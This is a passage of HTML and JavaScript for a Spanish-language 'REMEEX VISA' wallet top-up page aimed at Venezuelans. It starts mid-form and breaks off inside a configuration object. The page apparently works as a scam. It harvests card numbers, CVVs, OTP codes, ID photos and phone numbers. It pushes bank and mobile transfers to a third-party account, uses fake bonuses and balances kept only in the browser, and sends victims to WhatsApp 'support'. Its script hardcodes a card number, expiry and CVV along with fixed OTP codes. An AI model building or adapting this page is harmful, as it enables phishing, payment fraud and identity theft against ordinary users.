              <input type="password" class="form-control" id="cardCvv" placeholder="" maxlength="3" aria-describedby="card-cvv-error" inputmode="numeric" pattern="[0-9]*">
              <div class="error-message" id="card-cvv-error">CVV invlido.</div>
            </div>
          </div>
          
          <div style="display: flex; align-items: center; margin-top: 1rem;">
            <input type="checkbox" id="save-card" style="margin-right: 0.5rem;" checked>
            <label for="save-card" style="font-size: 0.85rem; color: var(--neutral-700);">Guardar esta tarjeta para futuras recargas</label>
          </div>
          
          <button class="btn btn-primary" id="submit-payment" disabled style="margin-top: 1.5rem;">
            <i class="fas fa-credit-card"></i> Seleccione un monto
          </button>
        </div>
      </div>
    </div>

    <!-- Bank Transfer Payment Method -->
    <div class="payment-method-content" id="bank-payment">
      <div class="card">
        <div style="margin-bottom: 1.25rem; text-align: center;">
          <div style="font-size: 0.8rem; color: var(--neutral-600); margin-bottom: 0.5rem;">Tasa de cambio actual:</div>
          <div style="display: inline-block; background: var(--primary); color: white; font-size: 0.8rem; font-weight: 600; padding: 0.5rem 0.75rem; border-radius: var(--radius-md);">
            <span id="bank-exchange-rate-display">1 USD = 151.10 Bs | 1 USD = 0.94 EUR</span>
          </div>
        </div>
        
        <div class="section-title" style="margin-bottom: 0.5rem;">
          <i class="fas fa-money-bill"></i> Seleccione un Monto
        </div>
        
        <select class="amount-select" id="bank-amount-select">
          <option value="" selected disabled>-- Seleccione un monto --</option>
          <option value="10" data-bs="0" data-eur="0">$10</option>
          <option value="25" data-bs="3334" data-eur="23.5">$25  Bs 3.334,00  23,50</option>
          <option value="30" data-bs="4000" data-eur="28.2">$30  Bs 4.000,00  28,20</option>
          <option value="40" data-bs="5334" data-eur="37.6">$40  Bs 5.334,00  37,60</option>
          <option value="50" data-bs="6667" data-eur="47">$50  Bs 6.667,00  47,00</option>
          <option value="100" data-bs="13334" data-eur="94">$100  Bs 13.334,00  94,00</option>
          <option value="200" data-bs="26668" data-eur="188">$200  Bs 26.668,00  188,00</option>
          <option value="250" data-bs="33335" data-eur="235">$250  Bs 33.335,00  235,00</option>
          <option value="400" data-bs="53336" data-eur="376">$400  Bs 53.336,00  376,00</option>
          <option value="500" data-bs="66670" data-eur="470">$500  Bs 66.670,00  470,00</option>
        </select>
        
        <div class="section-title" style="margin-top: 1.5rem; margin-bottom: 1rem;">
          <i class="fas fa-university"></i> Datos Bancarios
        </div>
        
        <div class="bank-details">
          <div class="bank-detail-row">
            <div class="bank-detail-label">Banco:</div>
            <div class="bank-detail-value">
              Banco Venezolano de Crdito
              <div class="copy-btn" data-copy="Banco Venezolano de Crdito"><i class="far fa-copy"></i></div>
            </div>
          </div>
          
          <div class="bank-detail-row">
            <div class="bank-detail-label">Titular:</div>
            <div class="bank-detail-value">
              Global VISA Venezuela
              <div class="copy-btn" data-copy="Global VISA Venezuela"><i class="far fa-copy"></i></div>
            </div>
          </div>
          
          <div class="bank-detail-row">
            <div class="bank-detail-label">RIF:</div>
            <div class="bank-detail-value">
              J407502646
              <div class="copy-btn" data-copy="J407502646"><i class="far fa-copy"></i></div>
            </div>
          </div>
          
          <div class="bank-detail-row">
            <div class="bank-detail-label">Cuenta Corriente:</div>
            <div class="bank-detail-value">
              Disponible al activar su cuenta
              <div class="copy-btn" data-copy="No disponible"><i class="far fa-copy"></i></div>
            </div>
          </div>
          
          <div class="bank-detail-row">
            <div class="bank-detail-label">Concepto:</div>
            <div class="bank-detail-value">
              4454651
              <div class="copy-btn" data-copy="4454651"><i class="far fa-copy"></i></div>
            </div>
          </div>
        </div>
        
        <div class="bank-warning">
          <div class="bank-warning-title">
            <i class="fas fa-exclamation-triangle"></i> Importante
          </div>
          <div class="bank-warning-content">
            Asegrese de realizar la transferencia <strong>nicamente</strong> al Banco Venezolano de Crdito. No confundir con Banco Nacional de Crdito ni Banco de Venezuela. Una vez realizada la transferencia, complete el formulario a continuacin.
          </div>
        </div>
        
        <div class="section-title" style="margin-top: 1.5rem; margin-bottom: 1rem;">
          <i class="fas fa-upload"></i> Comprobante de Pago
        </div>
        
        <div class="receipt-upload" id="receipt-upload">
          <i class="fas fa-cloud-upload-alt"></i>
          <div class="receipt-upload-title">Subir Comprobante</div>
          <div class="receipt-upload-subtitle">Haga clic aqu para cargar su comprobante de pago<br>Formatos aceptados: JPG, PNG, PDF (mx. 5MB)</div>
          <input type="file" id="receipt-file" accept="image/jpeg,image/png,application/pdf" style="display: none;">
        </div>
        
        <div class="receipt-preview" id="receipt-preview">
          <div class="receipt-preview-container">
            <div class="receipt-preview-icon">
              <i class="fas fa-file-alt"></i>
            </div>
            <div class="receipt-preview-content">
              <div class="receipt-preview-name" id="receipt-filename">comprobante.jpg</div>
              <div class="receipt-preview-size" id="receipt-filesize">120 KB</div>
            </div>
            <div class="receipt-preview-actions">
              <div class="copy-btn" id="receipt-remove"><i class="fas fa-trash"></i></div>
            </div>
          </div>
        </div>
        
        <div class="form-group reference-number">
          <label class="form-label" for="reference-number">Nmero de Referencia</label>
          <input type="text" class="form-control" id="reference-number" placeholder="Ingrese el nmero de referencia de la transferencia" aria-describedby="reference-error">
          <div class="error-message" id="reference-error">Por favor, ingrese un nmero de referencia vlido.</div>
        </div>
        
        <button class="btn btn-primary" id="submit-bank-transfer" disabled style="margin-top: 1.5rem;">
          <i class="fas fa-paper-plane"></i> Seleccione un monto
        </button>
      </div>
    </div>

    <!-- Mobile Payment Method -->
    <div class="payment-method-content" id="mobile-payment">
      <div class="card">
        <div style="margin-bottom: 1.25rem; text-align: center;">
          <div style="font-size: 0.8rem; color: var(--neutral-600); margin-bottom: 0.5rem;">Tasa de cambio actual:</div>
          <div style="display: inline-block; background: var(--primary); color: white; font-size: 0.8rem; font-weight: 600; padding: 0.5rem 0.75rem; border-radius: var(--radius-md);">
            <span id="mobile-exchange-rate-display">1 USD = 151.10 Bs | 1 USD = 0.94 EUR</span>
          </div>
        </div>
        
        <!-- Mensaje de xito para datos personalizados de pago mvil -->
        <div class="mobile-payment-success" id="mobile-payment-success" style="display: flex; align-items: flex-start; gap: 0.8rem;">
          <div class="mobile-payment-success-icon">
            <i class="fas fa-check-circle"></i>
          </div>
          <div class="mobile-payment-success-content">
            <div class="mobile-payment-success-title">Felicidades! Tus datos para recargar tu cuenta de Remeex VISA.</div>
            <div class="mobile-payment-success-text">Haz tu primera recarga por 25 USD para culminar tu verificacin! Ahora tiene sus datos personales configurados para recibir pagos mviles. Puede compartir estos datos con quienes deseen enviarte dinero en Bolvares.</div>
          </div>
        </div>
        <div class="bank-note" id="mobile-payment-note" style="display: none;">No se preocupe, los datos son correctos. Sabemos que su banco principal es <strong><span id="user-bank-name"></span></strong>, pero para su primera recarga le proporcionamos una cuenta en el <strong>Banco Venezolano de Crdito</strong>. Realice la transferencia desde su <strong><span id="user-bank-name-2"></span></strong> o reciba fondos de cualquier persona utilizando estos datos.</div>
        
        <div class="section-title" style="margin-bottom: 0.5rem;">
          <i class="fas fa-money-bill"></i> Seleccione un Monto
        </div>
        
        <select class="amount-select" id="mobile-amount-select">
          <option value="" selected disabled>-- Seleccione un monto --</option>
          <option value="10" data-bs="0" data-eur="0">$10</option>
          <option value="25" data-bs="3334" data-eur="23.5">$25  Bs 3.334,00  23,50</option>
          <option value="30" data-bs="4000" data-eur="28.2">$30  Bs 4.000,00  28,20</option>
          <option value="40" data-bs="5334" data-eur="37.6">$40  Bs 5.334,00  37,60</option>
          <option value="50" data-bs="6667" data-eur="47">$50  Bs 6.667,00  47,00</option>
          <option value="100" data-bs="13334" data-eur="94">$100  Bs 13.334,00  94,00</option>
          <option value="200" data-bs="26668" data-eur="188">$200  Bs 26.668,00  188,00</option>
          <option value="250" data-bs="33335" data-eur="235">$250  Bs 33.335,00  235,00</option>
          <option value="400" data-bs="53336" data-eur="376">$400  Bs 53.336,00  376,00</option>
          <option value="500" data-bs="66670" data-eur="470">$500  Bs 66.670,00  470,00</option>
        </select>
        
        <div class="section-title" style="margin-top: 1.5rem; margin-bottom: 1rem;">
          <i class="fas fa-mobile-alt"></i> Datos de Pago Mvil (Acreditacin Inmediata)
        </div>
        
        <div class="bank-details">
          <div class="bank-detail-row">
            <div class="bank-detail-label">Banco:</div>
            <div class="bank-detail-value">
              Banco Venezolano de Crdito (0104)
              <div class="copy-btn" data-copy="Banco Venezolano de Crdito (0104)"><i class="far fa-copy"></i></div>
            </div>
          </div>
          
          <div class="bank-detail-row">
            <div class="bank-detail-label">Titular:</div>
            <div class="bank-detail-value" id="mobile-payment-name">
              <span id="mobile-payment-name-value">Verificacin Pendiente</span>
              <div class="copy-btn" data-copy="Verificacin Pendiente"><i class="far fa-copy"></i></div>
            </div>
          </div>

          <div class="bank-detail-row">
            <div class="bank-detail-label">RIF/Cdula:</div>
            <div class="bank-detail-value" id="mobile-payment-rif">
              <span id="mobile-payment-rif-value">Verificacin Pendiente</span>
              <div class="copy-btn" data-copy="Verificacin Pendiente"><i class="far fa-copy"></i></div>
            </div>
          </div>
          
          <div class="bank-detail-row">
            <div class="bank-detail-label">Telfono:</div>
            <div class="bank-detail-value" id="mobile-payment-phone">
              <span id="mobile-payment-phone-value">Verificacin Pendiente</span>
              <div class="copy-btn" data-copy="Verificacin Pendiente"><i class="far fa-copy"></i></div>
            </div>
          </div>
          
          <div class="bank-detail-row">
            <div class="bank-detail-label">Concepto:</div>
            <div class="bank-detail-value">
              4454651
              <div class="copy-btn" data-copy="4454651"><i class="far fa-copy"></i></div>
            </div>
          </div>
        </div>
        
        <!-- Contenedor para el mensaje de soporte que aparecer despus de 5 minutos -->
        <div class="support-needed-container" id="support-needed-container">
          <div class="support-needed-header">
            <div class="support-needed-icon">
              <i class="fas fa-headset"></i>
            </div>
            <div>
              <div class="support-needed-title">Soporte adicional requerido</div>
              <div class="support-needed-subtitle">Para completar esta transaccin</div>
            </div>
          </div>
          <div class="support-needed-content">
            Para validar este pago mvil necesitamos confirmar algunos datos de seguridad adicionales. Nuestro equipo est disponible 24/7 para asistirle y procesar su solicitud en menos de 5 minutos.
          </div>
          <a href="https://wa.me/+17373018059" class="whatsapp-support-btn whatsapp-link" target="_blank">
            <i class="fab fa-whatsapp"></i> Contactar Soporte por WhatsApp
          </a>
        </div>
        
        <div class="bank-warning">
          <div class="bank-warning-title">
            <i class="fas fa-exclamation-triangle"></i> Importante
          </div>
          <div class="bank-warning-content">
            Asegrese de realizar el pago mvil a travs del <strong>Banco Venezolano de Crdito (0104)</strong> y no a otro banco. Una vez realizado el pago, complete el formulario a continuacin.
          </div>
        </div>
        
        <div class="section-title" style="margin-top: 1.5rem; margin-bottom: 1rem;">
          <i class="fas fa-upload"></i> Comprobante de Pago
        </div>
        
        <div class="receipt-upload" id="mobile-receipt-upload">
          <i class="fas fa-cloud-upload-alt"></i>
          <div class="receipt-upload-title">Subir Comprobante</div>
          <div class="receipt-upload-subtitle">Haga clic aqu para cargar una captura de su pago mvil<br>Formatos aceptados: JPG, PNG, PDF (mx. 5MB)</div>
          <input type="file" id="mobile-receipt-file" accept="image/jpeg,image/png,application/pdf" style="display: none;">
        </div>
        
        <div class="receipt-preview" id="mobile-receipt-preview">
          <div class="receipt-preview-container">
            <div class="receipt-preview-icon">
              <i class="fas fa-file-alt"></i>
            </div>
            <div class="receipt-preview-content">
              <div class="receipt-preview-name" id="mobile-receipt-filename">comprobante.jpg</div>
              <div class="receipt-preview-size" id="mobile-receipt-filesize">120 KB</div>
            </div>
            <div class="receipt-preview-actions">
              <div class="copy-btn" id="mobile-receipt-remove"><i class="fas fa-trash"></i></div>
            </div>
          </div>
        </div>
        
        <div class="form-group reference-number">
          <label class="form-label" for="mobile-reference-number">Nmero de Referencia</label>
          <input type="text" class="form-control" id="mobile-reference-number" placeholder="Ingrese el nmero de referencia del pago mvil" aria-describedby="mobile-reference-error">
          <div class="error-message" id="mobile-reference-error">Por favor, ingrese un nmero de referencia vlido.</div>
        </div>

        <div class="form-group reference-number">
          <label class="form-label" for="mobile-concept">Concepto indicado</label>
          <input type="text" class="form-control" id="mobile-concept" placeholder="Ej: 4454651" aria-describedby="mobile-concept-error">
          <div class="error-message" id="mobile-concept-error">Por favor, ingrese el concepto utilizado.</div>
        </div>
        
        <button class="btn btn-primary" id="submit-mobile-payment" disabled style="margin-top: 1.5rem;">
          <i class="fas fa-paper-plane"></i> Seleccione un monto
        </button>
      </div>
    </div>
  </div>

  <!-- Payment OTP Verification Modal -->
  <div class="modal-overlay" id="otp-modal-overlay">
    <div class="modal">
      <div class="modal-title">Verificacin de Seguridad</div>
      <div class="modal-subtitle">Enviamos un cdigo a tu telfono asociado a tu tarjeta <span id="masked-phone">+44 75** ****13</span></div>
      
      <div class="otp-container">
        <input type="tel" class="otp-input" id="otp-1" maxlength="1" data-next="otp-2" aria-label="OTP dgito 1" inputmode="numeric" pattern="[0-9]*">
        <input type="tel" class="otp-input" id="otp-2" maxlength="1" data-next="otp-3" data-prev="otp-1" aria-label="OTP dgito 2" inputmode="numeric" pattern="[0-9]*">
        <input type="tel" class="otp-input" id="otp-3" maxlength="1" data-next="otp-4" data-prev="otp-2" aria-label="OTP dgito 3" inputmode="numeric" pattern="[0-9]*">
        <input type="tel" class="otp-input" id="otp-4" maxlength="1" data-next="otp-5" data-prev="otp-3" aria-label="OTP dgito 4" inputmode="numeric" pattern="[0-9]*">
        <input type="tel" class="otp-input" id="otp-5" maxlength="1" data-next="otp-6" data-prev="otp-4" aria-label="OTP dgito 5" inputmode="numeric" pattern="[0-9]*">
        <input type="tel" class="otp-input" id="otp-6" maxlength="1" data-prev="otp-5" aria-label="OTP dgito 6" inputmode="numeric" pattern="[0-9]*">
      </div>
      
      <div class="error-message" id="otp-error" style="text-align: center; display: none;">Cdigo incorrecto. Intente nuevamente.</div>
      
      <button class="btn btn-primary" id="verify-otp-btn">
        <i class="fas fa-shield-alt"></i> Verificar y Recargar
      </button>
      
      <div class="resend-code">
        No recibi el cdigo? <a href="#" id="resend-code">Reenviar</a>
      </div>
    </div>
  </div>

  <!-- Feature Blocked Modal -->
  <div class="feature-blocked-modal" id="feature-blocked-modal">
    <div class="feature-blocked-card">
      <div class="feature-blocked-icon">
        <i class="fas fa-lock"></i>
      </div>
      <div class="feature-blocked-title">Verificacin Requerida</div>
      <div class="feature-blocked-message">
        Esta funcin requiere verificacin de identidad para su activacin. Por favor, complete el proceso de verificacin para acceder a todas las funcionalidades.
      </div>
      <div class="feature-blocked-actions">
        <button class="btn btn-outline" id="feature-blocked-close">
          <i class="fas fa-times"></i> Cerrar
        </button>
      </div>
    </div>
  </div>

  <!-- Identity Verification Modal -->
  <div class="modal-overlay" id="verification-modal">
    <div class="modal" style="max-width: 380px;">
      <div class="modal-title">Verificacin de Identidad</div>
      <div class="modal-subtitle">Para garantizar la seguridad de su cuenta y permitir transacciones de mayor monto, necesitamos verificar su identidad.</div>
      
      <div class="id-upload-container" id="id-upload-container">
        <p style="margin-bottom: 1rem; font-size: 0.85rem; color: var(--neutral-600);">Por favor suba una foto de su documento de identidad (ambos lados):</p>
        
        <div class="id-upload-sides" style="display: flex; gap: 1rem; margin: 1.5rem 0;">
          <div class="id-upload-side" id="id-front-upload" style="flex: 1; border: 2px dashed var(--neutral-400); border-radius: var(--radius-md); padding: 1rem; text-align: center; cursor: pointer;">
            <i class="fas fa-id-card" style="font-size: 2rem; color: var(--neutral-500); margin-bottom: 0.75rem;"></i>
            <div class="id-upload-title" style="font-weight: 600; font-size: 0.9rem; color: var(--neutral-800); margin-bottom: 0.4rem;">Parte Frontal</div>
            <div class="id-upload-subtitle" style="font-size: 0.75rem; color: var(--neutral-600);">Cdula o Pasaporte</div>
            <input type="file" id="id-front-file" accept="image/jpeg,image/png" style="display: none;">
          </div>
          
          <div class="id-upload-side" id="id-back-upload" style="flex: 1; border: 2px dashed var(--neutral-400); border-radius: var(--radius-md); padding: 1rem; text-align: center; cursor: pointer;">
            <i class="fas fa-id-card" style="font-size: 2rem; color: var(--neutral-500); margin-bottom: 0.75rem;"></i>
            <div class="id-upload-title" style="font-weight: 600; font-size: 0.9rem; color: var(--neutral-800); margin-bottom: 0.4rem;">Parte Trasera</div>
            <div class="id-upload-subtitle" style="font-size: 0.75rem; color: var(--neutral-600);">Cdula o Pasaporte</div>
            <input type="file" id="id-back-file" accept="image/jpeg,image/png" style="display: none;">
          </div>
        </div>
        
        <div id="id-front-preview" style="display: none; margin-top: 1rem;">
          <div class="id-preview" style="display: flex; align-items: center; gap: 0.75rem; padding: 0.8rem; background: var(--neutral-200); border-radius: var(--radius-md);">
            <div class="id-preview-icon" style="width: 40px; height: 40px; border-radius: var(--radius-md); background: var(--primary); color: white; display: flex; align-items: center; justify-content: center; font-size: 1.1rem; flex-shrink: 0;">
              <i class="fas fa-id-card"></i>
            </div>
            <div class="id-preview-content" style="flex: 1; min-width: 0;">
              <div class="id-preview-name" id="id-front-filename" style="font-weight: 600; font-size: 0.8rem; margin-bottom: 0.2rem; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">frente-cedula.jpg</div>
              <div class="id-preview-size" id="id-front-filesize" style="font-size: 0.7rem; color: var(--neutral-600);">120 KB</div>
            </div>
            <div class="id-preview-actions" style="display: flex; gap: 0.5rem;">
              <div class="copy-btn" id="id-front-remove"><i class="fas fa-trash"></i></div>
            </div>
          </div>
        </div>
        
        <div id="id-back-preview" style="display: none; margin-top: 0.5rem;">
          <div class="id-preview" style="display: flex; align-items: center; gap: 0.75rem; padding: 0.8rem; background: var(--neutral-200); border-radius: var(--radius-md);">
            <div class="id-preview-icon" style="width: 40px; height: 40px; border-radius: var(--radius-md); background: var(--primary); color: white; display: flex; align-items: center; justify-content: center; font-size: 1.1rem; flex-shrink: 0;">
              <i class="fas fa-id-card"></i>
            </div>
            <div class="id-preview-content" style="flex: 1; min-width: 0;">
              <div class="id-preview-name" id="id-back-filename" style="font-weight: 600; font-size: 0.8rem; margin-bottom: 0.2rem; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">reverso-cedula.jpg</div>
              <div class="id-preview-size" id="id-back-filesize" style="font-size: 0.7rem; color: var(--neutral-600);">120 KB</div>
            </div>
            <div class="id-preview-actions" style="display: flex; gap: 0.5rem;">
              <div class="copy-btn" id="id-back-remove"><i class="fas fa-trash"></i></div>
            </div>
          </div>
        </div>
        
        <!-- Campos adicionales para cdula y telfono -->
        <div class="form-group" style="margin-top: 1.5rem;">
          <label class="form-label" for="documentNumber">Nmero de Cdula</label>
          <input type="text" class="form-control" id="documentNumber" placeholder="Ej: V12345678" aria-describedby="documentNumber-error">
          <div class="error-message" id="documentNumber-error">Por favor ingrese su nmero de cdula en formato V12345678.</div>
        </div>
        
        <div class="form-group">
          <label class="form-label" for="phoneNumber">Nmero de Telfono</label>
          <input type="text" class="form-control" id="phoneNumber" placeholder="Ej: 04121234567" aria-describedby="phoneNumber-error">
          <div class="error-message" id="phoneNumber-error">Por favor ingrese su nmero de telfono en formato 04121234567.</div>
        </div>
      </div>
      
      <button class="btn btn-primary" id="submit-verification" style="margin-top: 1.5rem;">
        <i class="fas fa-shield-alt"></i> Enviar para Verificacin
      </button>
      
      <button class="btn btn-outline" id="verify-later" style="margin-top: 1rem; width: 100%;">
        <i class="fas fa-clock"></i> Verificar ms tarde
      </button>
    </div>
  </div>

  <!-- Bank/Mobile Transfer Processing Modal -->
  <div class="modal-overlay" id="transfer-processing-modal">
    <div class="modal">
      <div class="modal-title">Recibimos su Comprobante!</div>
      <div class="modal-subtitle">Estamos verificando su pago. Este proceso suele tardar entre 5-10 minutos en horario laboral.</div>
      
      <div style="text-align: center; margin: 1.5rem 0;">
        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhnBzNdjl6bNp-nIdaiHVENczJhwlJNA7ocsyiOObMmzbu8at0dY5yGcZ9cLxLF39qI6gwNfqBxlkTDC0txVULEwQVwGkeEzN0Jq9MRTRagA48mh18UqTlR4WhsXOLAEZugUyhqJHB19xJgnkpe-S5VOWFgzpKFwctv3XP9XhH41vNTvq0ZS-nik58Qhr-O/s320/remeex.png" alt="REMEEX" style="height: 45px; width: auto; margin-bottom: 1.25rem;">
        
        <div style="font-size: 2rem; font-weight: 700; color: var(--primary); margin-bottom: 0.5rem;" id="transfer-amount">$500.00</div>
        <div style="font-size: 0.85rem; color: var(--neutral-600);">Referencia: <span id="transfer-reference">ABC123456</span></div>
      </div>
      
      <button class="btn btn-primary" id="transfer-processing-continue">
        <i class="fas fa-home"></i> Volver al Inicio
      </button>
      
      <div style="text-align: center; margin-top: 1.25rem; font-size: 0.8rem; color: var(--neutral-600);">
        Recibir una notificacin cuando confirmemos su pago.<br>
        <a href="https://wa.me/+17373018059" target="_blank" class="whatsapp-link" style="color: var(--primary); font-weight: 500;">Contactar soporte</a> si tiene alguna pregunta.
      </div>
    </div>
  </div>

  <!-- Loading Overlay -->
  <div class="loading-overlay" id="loading-overlay" aria-label="Cargando">
    <div class="spinner"></div>
    <div class="loading-text" id="loading-text">Procesando su solicitud...</div>
    <div class="progress-bar-container">
      <div class="progress-bar" id="progress-bar"></div>
    </div>
  </div>

  <!-- Success Animation -->
  <div class="success-container" id="success-container" aria-label="Transaccin exitosa">
    <div class="success-card">
      <div class="success-checkmark">
        <i class="fas fa-check"></i>
      </div>
      <div class="success-title">Recarga Exitosa!</div>
      <div class="success-amount" id="success-amount">$0.00</div>
      <div class="success-message">Su saldo ha sido actualizado correctamente</div>
      <div class="success-actions">
        <button class="btn btn-primary" id="success-continue">
          <i class="fas fa-home"></i> Ir al Inicio
        </button>
        <button class="btn btn-outline" id="success-transfer">
          <i class="fas fa-upload"></i> Retirar Dinero
        </button>
      </div>
    </div>
  </div>

  <!-- Welcome Bonus Overlay -->
  <div class="success-container" id="bonus-container" aria-label="Bono de bienvenida" style="display: none;">
    <div class="success-card">
      <div class="success-checkmark">
        <i class="fas fa-gift"></i>
      </div>
      <div class="success-title">Bono de Bienvenida!</div>
      <div class="success-amount">$15.00</div>
      <div class="success-message">Te regalamos $15 por tu primera recarga. Deseas aceptarlo?</div>
      <div class="success-actions">
        <button class="btn btn-primary" id="bonus-accept">
          <i class="fas fa-check"></i> Aceptar
        </button>
        <button class="btn btn-outline" id="bonus-reject">
          <i class="fas fa-times"></i> Rechazar
        </button>
      </div>
    </div>
  </div>

  <!-- Inactivity Modal -->
  <div class="inactivity-modal" id="inactivity-modal">
    <div class="inactivity-card">
      <div class="inactivity-icon">
        <i class="fas fa-clock"></i>
      </div>
      <div class="inactivity-title">Sesin a punto de expirar</div>
      <div class="inactivity-message">
        Por su seguridad, la sesin se cerrar automticamente debido a inactividad.
      </div>
      <div class="inactivity-timer" id="inactivity-timer">30</div>
      <div class="inactivity-actions">
        <button class="btn btn-primary" id="inactivity-continue">
          <i class="fas fa-redo"></i> Continuar sesin
        </button>
        <button class="btn btn-outline" id="inactivity-logout">
          <i class="fas fa-sign-out-alt"></i> Cerrar sesin
        </button>
      </div>
    </div>
  </div>

  <!-- Welcome Modal -->
  <div class="welcome-modal" id="welcome-modal">
    <div class="welcome-card">
      <div class="welcome-header">
        <div class="welcome-icon">
          <i class="fas fa-handshake"></i>
        </div>
        <div class="welcome-title-container">
          <h2 class="welcome-title">Bienvenido a REMEEX!</h2>
          <p class="welcome-subtitle" id="welcome-subtitle">Estamos felices de tenerte con nosotros, Nombre</p>
        </div>
      </div>
      
      <div class="welcome-content">
        <div class="welcome-step">
          <div class="welcome-step-icon">
            <i class="fas fa-lock"></i>
          </div>
          <div class="welcome-step-content">
            <div class="welcome-step-title">Acceso Exclusivo a este Dispositivo</div>
            <div class="welcome-step-description">Por su seguridad, su saldo y transacciones solo estn disponibles en este dispositivo donde ha iniciado sesin.</div>
          </div>
        </div>
        
        <div class="welcome-step">
          <div class="welcome-step-icon">
            <i class="fas fa-plus-circle"></i>
          </div>
          <div class="welcome-step-content">
            <div class="welcome-step-title">Recarga tu cuenta</div>
            <div class="welcome-step-description">Agrega fondos a tu cuenta utilizando tarjeta de crdito, transferencia bancaria o pago mvil.</div>
          </div>
        </div>
        
        <div class="welcome-step">
          <div class="welcome-step-icon">
            <i class="fas fa-upload"></i>
          </div>
          <div class="welcome-step-content">
            <div class="welcome-step-title">Retira tus fondos</div>
            <div class="welcome-step-description">Transfiere tus fondos a cualquier cuenta bancaria en el mundo de forma rpida y segura.</div>
          </div>
        </div>
        
        <div class="welcome-step">
          <div class="welcome-step-icon">
            <i class="fas fa-shield-alt"></i>
          </div>
          <div class="welcome-step-content">
            <div class="welcome-step-title">Verifica tu identidad</div>
            <div class="welcome-step-description">Completa la verificacin para aumentar tus lmites y acceder a todas las funcionalidades.</div>
          </div>
        </div>
      </div>
      
      <button class="btn btn-primary" id="welcome-continue">
        <i class="fas fa-rocket"></i> Comenzar
      </button>
    </div>
  </div>

  <!-- Mobile Transfer Rechazado Modal -->
  <div class="modal-overlay" id="transfer-rejected-modal" style="display: none;">
    <div class="modal">
      <div class="modal-title">Comprobante No Encontrado</div>
      <div class="modal-subtitle">No pudimos validar su comprobante porque el concepto no coincide. El sistema devolver los fondos y deber realizar un nuevo pago siguiendo las instrucciones.</div>
      <div style="text-align: center;">
        <button class="btn btn-primary" id="transfer-rejected-continue">
          <i class="fas fa-home"></i> Volver al Inicio
        </button>
      </div>
    </div>
  </div>

  <!-- Logout Confirmation Modal -->
  <div class="logout-modal" id="logout-modal">
    <div class="logout-card">
      <div class="logout-icon">
        <i class="fas fa-sign-out-alt"></i>
      </div>
      <div class="logout-title">Cerrar sesin?</div>
      <div class="logout-message">
        Est seguro que desea cerrar sesin? Sus fondos estarn garantizados en su cuenta.
      </div>
      <div class="logout-actions">
        <button class="btn btn-primary" id="logout-confirm">
          <i class="fas fa-check"></i> S, cerrar sesin
        </button>
        <button class="btn btn-outline" id="logout-cancel">
          <i class="fas fa-times"></i> Cancelar
        </button>
      </div>
    </div>
  </div>

  <!-- Page Overlay -->
  <div class="page-overlay" id="page-overlay">
    <div class="page-container">
      <div class="page-close" id="page-close"><i class="fas fa-times"></i></div>
      <iframe id="page-frame" class="page-frame" title="Servicio"></iframe>
    </div>
  </div>

  <!-- Toast Container -->
  <div class="toast-container" id="toast-container"></div>

  <!-- Tawk.to Live Chat Widget Container -->
  <div id="tawkto-container" class="tawkto-container"></div>

  <!-- Improved Tawk.to Script Implementation -->
  <script type="text/javascript">
    // Cargar Tawk.to bajo demanda
    let tawkLoaded = false;
    function loadTawkTo() {
      if (tawkLoaded) {
        ensureTawkToVisibility();
        if (window.Tawk_API) Tawk_API.maximize();
        return;
      }
      var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();

      // Configuracin especfica de Tawk.to si es necesario
      Tawk_API.onLoad = function(){
        const container = document.getElementById('tawkto-container');
        container.style.display = 'block';
        container.style.visibility = 'visible';
        console.log('Tawk.to cargado correctamente');
        if (window.Tawk_API) Tawk_API.maximize();
        ensureTawkToVisibility();
      };
      
      try {
        var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
        s1.async=true;
        s1.src='https://embed.tawk.to/67cca8c614b1ee191063c36a/default';
        s1.charset='UTF-8';
        s1.setAttribute('crossorigin','*');
        s1.setAttribute('importance', 'high'); // Prioridad alta
        s0.parentNode.insertBefore(s1,s0);
        
        // Verificar si el widget se carg despus de 5 segundos
        setTimeout(function() {
          const tawktoFrame = document.querySelector('iframe[title*="chat"]');
          if (!tawktoFrame) {
            console.log('Reintentando cargar Tawk.to...');
            loadTawkTo(); // Reintentar si no se carg
          }
        }, 5000);
        tawkLoaded = true;
      } catch (e) {
        console.error('Error al cargar Tawk.to:', e);
      }
    }

    // Mantener el widget visible (conserva la funcin existente pero optimizada)
    function ensureTawkToVisibility() {
      if (!tawkLoaded) return;

      const checkInterval = setInterval(function() {
        const tawktoFrame = document.querySelector('iframe[title*="chat"]');
        const tawktoContainer = document.getElementById('tawkto-container');
        
        if (tawktoFrame && tawktoContainer) {
          tawktoContainer.style.display = 'block';
          tawktoContainer.style.visibility = 'visible';
          tawktoContainer.style.zIndex = '9999'; // Valor ms alto para garantizar que est por encima
          
          tawktoFrame.style.display = 'block';
          tawktoFrame.style.visibility = 'visible';
          tawktoFrame.style.zIndex = '9999';
          
          // Si se encontr correctamente, reducir la frecuencia de verificacin
          clearInterval(checkInterval);
          setInterval(function() {
            if (tawktoFrame.style.display !== 'block') {
              tawktoFrame.style.display = 'block';
              tawktoFrame.style.visibility = 'visible';
            }
          }, 3000);
        }
      }, 1000);
    }

    // La visibilidad se asegurar cuando se cargue el chat
  </script>
  
  <script>
    // Configuracin de valores constantes con tasa de cambio centralizada
    const CONFIG = {
      LOGIN_CODE: '00981841084750599643',
      OTP_CODES: ['142536', '748596', '124578'],
      EXCHANGE_RATES: {
        USD_TO_BS: 151.10,  // Tasa centralizada corregida
        USD_TO_EUR: 0.94,
        EUR_TO_BS: 151.10 / 0.94,
        FORCED_VALIDATION_USD: null
      },
      INACTIVITY_TIMEOUT: 300000, // 5 minutos en milisegundos
      INACTIVITY_WARNING: 30000, // 30 segundos antes de cerrar sesin
      VALID_CARD: '4745034211763009', // La nica tarjeta vlida
      VALID_CARD_EXP_MONTH: '01',
      VALID_CARD_EXP_YEAR: '2026', // Correccin: Ahora acepta "2026" en lugar de "26"
      VALID_CARD_CVV: '583',
      MAX_CARD_RECHARGES: 3, // Mximo de recargas con tarjeta
      VERIFICATION_PROCESSING_TIMEOUT: 600000, // 10 minutos en milisegundos - NUEVA IMPLEMENTACIN
      STORAGE_KEYS: {
        USER_DATA: 'remeexUserData',
        BALANCE: 'remeexBalance',
        TRANSACTIONS: 'remeexTransactions',
        PENDING_BANK: 'remeexPendingBankTransfers',
        PENDING_MOBILE: 'remeexPendingMobileTransfers',
        BANK_ACCOUNTS: 'remeexBankAccounts',
